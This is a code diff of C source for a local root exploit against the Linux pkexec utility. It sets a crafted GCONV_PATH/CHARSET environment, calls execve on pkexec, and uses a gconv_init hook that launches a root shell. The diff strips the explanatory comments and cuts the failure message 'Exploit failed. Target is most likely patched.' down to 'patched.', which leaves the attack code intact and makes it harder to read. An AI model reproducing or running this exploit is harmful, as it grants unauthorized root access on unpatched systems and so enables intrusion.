@@ -16,11 +16,10 @@
 #include <sys/types.h>
 #include <sys/signal.h>
 
-// 64-bit library
 #ifdef __amd64__
 const char service_interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";
 #endif
-// 32-bit library
+
 #ifdef __i386__
 const char service_interp[] __attribute__((section(".interp"))) = "/lib/ld-linux.so.2";
 #endif
@@ -93,8 +92,7 @@ void entry()
 
         buf[read(pipefd[0], buf, sizeof(buf)-1)] = 0;
         if (strstr(buf, "pkexec --version") == buf) {
-            // Cleanup for situations where the exploit didn't work
-            puts("Exploit failed. Target is most likely patched.");
+            puts("patched.");
 
             rmrf("GCONV_PATH=.");
             rmrf(".pkexec");
@@ -115,8 +113,6 @@ void entry()
     char *args[] = {NULL};
     char *env[] = {".pkexec", "PATH=GCONV_PATH=.", "CHARSET=pkexec", "SHELL=pkexec", cmd, NULL};
     execve("/usr/bin/pkexec", args, env);
-
-    // In case pkexec is not in /usr/bin/
     execvpe("pkexec", args, env);
 
     _exit(0);
@@ -139,10 +135,7 @@ void gconv_init()
     if (cmd) {
         execve("/bin/sh", (char *[]){"/bin/sh", "-c", cmd, NULL}, NULL);
     } else {
-        // Try interactive bash first
         execve("/bin/bash", (char *[]){"-i", NULL}, NULL);
-
-        // In case interactive bash was not possible
         execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
     }
     _exit(0);
